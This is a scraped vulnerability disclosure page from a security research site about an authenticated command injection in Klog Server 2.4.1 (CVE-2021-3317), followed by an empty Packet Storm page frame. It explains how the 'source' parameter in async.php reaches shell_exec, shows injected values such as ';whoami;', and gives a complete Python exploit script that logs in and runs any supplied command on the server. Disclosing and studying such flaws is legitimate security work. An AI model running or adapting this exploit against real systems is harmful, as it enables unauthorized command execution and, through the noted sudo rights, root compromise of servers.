=== Content from docs.unsafe-inline.com_fd68c21f_20250114_204408.html ===
[![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MOWsiA3y7BsN5oohlsn%252Ficon%252FrpbbiObyjMteGqa61bzF%252Funnamed.jpg%3Falt%3Dmedia%26token%3Ded8305b2-a230-4c44-b1c4-f38ea271f0e9&width=32&dpr=4&quality=100&sign=70b95db7&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MOWsiA3y7BsN5oohlsn%252Ficon%252FrpbbiObyjMteGqa61bzF%252Funnamed.jpg%3Falt%3Dmedia%26token%3Ded8305b2-a230-4c44-b1c4-f38ea271f0e9&width=32&dpr=4&quality=100&sign=70b95db7&sv=2)UI](/)Search...Ctrl + K

* [ABOUT US](/)
* [UNSAFE](/unsafe)
  + [sAMAccountName Spoofing in the Forest](/unsafe/samaccountname-spoofing-in-the-forest)
  + [Pass-the-Hash Attack Over Named Pipes Against ESET Server Security](/unsafe/pass-the-hash-attack-over-named-pipes-against-eset-server-security)
  + [Netcat Relay](/unsafe/netcat-relay)
  + [Hiren's BootCD in the AD](/unsafe/hirens-bootcd-in-the-ad)
  + [Abusing LAPS](/unsafe/abusing-laps)
* [INLINE](/inline)
  + [Asena](/inline/asena-tool)
  + [Suyla](/inline/suyla-tool)
  + [dcFinder](/inline/dcfinder)
* 0DAY
  + [ADManager Plus Build < 7210 Elevation of Privilege Vulnerability (CVE-2024-24409)](/0day/admanager-plus-build-less-than-7210-elevation-of-privilege-vulnerability-cve-2024-24409)
  + [Asp.Net Zero v12.3.0 - HTML Injection Leads To Open Redirect via Websockets (CVE-2023-48003)](/0day/asp.net-zero-v12.3.0-html-injection-leads-to-open-redirect-via-websockets-cve-2023-48003)
  + [ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure (CVE-2023-31492)](/0day/manageengine-admanager-plus-build-less-than-7183-recovery-password-disclosure-cve-2023-31492)
  + [Multiple ManageEngine Applications Critical Information Disclosure Vulnerability](/0day/multiple-manageengine-applications-critical-information-disclosure-vulnerability)
  + [Thecus N4800Eco Nas Server Control Panel Comand Injection](/0day/thecus-n4800eco-nas-server-control-panel-comand-injection)
  + [ManageEngine ADSelfService Plus 6.1 CSV Injection (CVE-2021-33256)](/0day/manageengine-adselfservice-plus-6.1-csv-injection)
  + [Openlitespeed Web Server 1.7.8 - Privilege Escalation (CVE-2021-26758)](/0day/openlitespeed-web-server-1.7.8-command-injection-to-privilege-escalation-cve-2021-26758)
  + [KLOG Server (Authenticated) Command Injection (CVE-2021-3317)](/0day/klog-server-authenticated-command-injection)
  + [Cokpit version 234 - Server Side Request Forgery (CVE-2020-35850)](/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850)
  + [KLOG Server Unauthenticated Command Injection (CVE-2020-35729)](/0day/klog-server-unauthentication-command-injection)
  + [Pearson Vue - VUEApplicationWrapper Unquoted Service Path (CVE-2020-36154)](/0day/pearson-vue-vueapplicationwrapper-unquoted-service-path)
  + [Intel(r) Management and Security Application 5.2 - UNS Unquoted Service Path](/0day/intel-uns-unquoted-service-path)
  + [BRAdmin Professional 3.75 - Unquoted Service Path](/0day/bradmin-professional-3.75-unquoted-service-path)

[Powered by GitBook](https://www.gitbook.com/?utm_source=content&utm_medium=trademark&utm_campaign=-MOWsiA3y7BsN5oohlsn)On this page

Was this helpful?

1. [0DAY](/0day)
# KLOG Server (Authenticated) Command Injection (CVE-2021-3317)

Klog Server 2.4.1 - Command Injection (Authenticated)

[PreviousOpenlitespeed Web Server 1.7.8 - Privilege Escalation (CVE-2021-26758)](/0day/openlitespeed-web-server-1.7.8-command-injection-to-privilege-escalation-cve-2021-26758)[NextCokpit version 234 - Server Side Request Forgery (CVE-2020-35850)](/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850)

Last updated 9 months ago

## # Detection

I have detected a authenticated command injection vulnerability in the Klog Server <=2.4.1 . `async.php` file includes that `source` parameter is executed via shell\_exec() function without input validation.

As you can see above image, if `action` parameter is set as `stream` , command injection could be possible due to `source` parameter is executed by shell\_exec() function through `command` variable.

To validate this vulnerability , sleep command is used. For `;sleep+5;` command , the server stays 5 seconds or so.

When `;whoami;` command is executed , the output indicates privileges as `apache` user . However , `apache` user is a member of sudo group so that we can execute commad with `root` privileges.

## # Exploitation

Copy
```
import argparse
import requests
import sys
import urllib3
from argparse import ArgumentParser, Namespace
def main():
    dsc = "Klog Server 2.4.1 - Command Injection (Authenticated)"
    parser: ArgumentParser = argparse.ArgumentParser(description=dsc)
    parser.add_argument("--target", help="IPv4 address of Cockpit server", type=str, required=True)
    parser.add_argument("--username", help="Username", type=str, required=True)
    parser.add_argument("--password", help="Password", type=str, required=True)
    parser.add_argument("--command", help="Command", type=str, required=True)
    args: Namespace = parser.parse_args()
    if args.target:
        target = args.target
        if args.username:
            username = args.username
            if args.password:
                password = args.password
                if args.command:
                    command = args.command
                exploit(target, username, password, command)
def exploit(target, username, password, command):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = requests.Session()
    headers = {
    	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip, deflate",
         "Content-Type": "application/x-www-form-urlencoded",
         "Connection": "close",
         "Upgrade-Insecure-Requests": "1",
         }

    data = {"user" : username, "pswd" : password}
    login = s.post("https://" + target + "/actions/authenticate.php" , data=data, headers=headers, allow_redirects=False, verify=False)
    print("[*] Status Code for login request: " + str(login.status_code))
    if login.status_code == 302:
        check = s.get("https://" + target + "/index.php", allow_redirects=False, verify=False)
        if check.status_code == 200:
            print("[+] Authentication was successful!")
        else:
            print("[-] Authentication was unsuccessful!")
            sys.exit(1)
    else:
        print("Something went wrong!")
        sys.exit(1)

    print("[*] Exploiting...\n")
    executeCommand = s.get("https://" + target + "/actions/async.php?action=stream&source=;"+ command +";", allow_redirects=False, verify=False)
    print(executeCommand.text)
    sys.exit(0)
if __name__ == '__main__':
    main()

```
Copy
```
# Author: Metin Yunus Kandemir
```

* [# Detection](#detection)
* [# Exploitation](#exploitation)
[![Logo](https://www.exploit-db.com/favicon.ico)Klog Server 2.4.1 - Command Injection (Authenticated)Exploit Database](https://www.exploit-db.com/exploits/49511)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MRvcfPykE1nWIfAgwIz%252F-MRvgi5ZMRm8VpLkS0a4%252F2.PNG%3Falt%3Dmedia%26token%3Dfa3dcc36-a6d9-48ae-9a33-f3473ae63fa7&width=768&dpr=4&quality=100&sign=65b9f25f&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MRvcfPykE1nWIfAgwIz%252F-MRvhZ2VATGNRm9O7Drt%252F4.PNG%3Falt%3Dmedia%26token%3D0d060f1b-b07b-4421-95ef-00f957d39449&width=768&dpr=4&quality=100&sign=9170c49e&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MRvQ6TRmB6kFziSMJks%252F-MRvS-XPOh3OteuYADo3%252F3.PNG%3Falt%3Dmedia%26token%3Dab8583ac-046e-435a-8f2e-7fea3937e62a&width=768&dpr=4&quality=100&sign=70168dca&sv=2)![](https://docs.unsafe-inline.com/~gitbook/image?url=https%3A%2F%2F1825299558-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MOWsiA3y7BsN5oohlsn%252F-MRvS4hY9NGgSCjqkHZU%252F-MRvZF1K59PGfwxxQy4e%252F1.PNG%3Falt%3Dmedia%26token%3D0f35b1e7-3336-49a7-ab7e-d573333c742b&width=768&dpr=4&quality=100&sign=568e6bef&sv=2)

=== Content from packetstormsecurity.com_1d410752_20250114_204407.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


